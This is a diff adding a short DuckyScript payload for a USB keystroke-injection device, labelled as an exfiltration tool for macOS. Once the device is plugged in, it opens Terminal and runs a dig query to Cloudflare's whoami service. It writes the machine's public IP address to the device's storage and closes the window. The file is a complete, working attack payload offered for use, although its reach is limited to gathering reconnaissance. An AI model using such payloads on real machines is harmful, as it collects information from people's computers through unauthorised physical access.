@@ -1,0 +1,22 @@
+REM Title:         Public IP Grabber
+REM Description:   Extracts the public IP address of the current connected network onto the ducky
+REM Author:        matthewkayne
+REM Category:      Exfiltration
+REM Target:        macOS (Terminal)
+REM Requires:      Twin Duck firmware or separate USB stick (requires change to the path of the file)
+
+
+DELAY 1000
+GUI SPACE
+DELAY 400
+STRING terminal
+ENTER
+DELAY 200
+STRING dig +short txt ch whoami.cloudflare @1.0.0.1 > /Volumes/DUCKY/public-ip.txt
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+GUI w
+DELAY 200
+ENTER
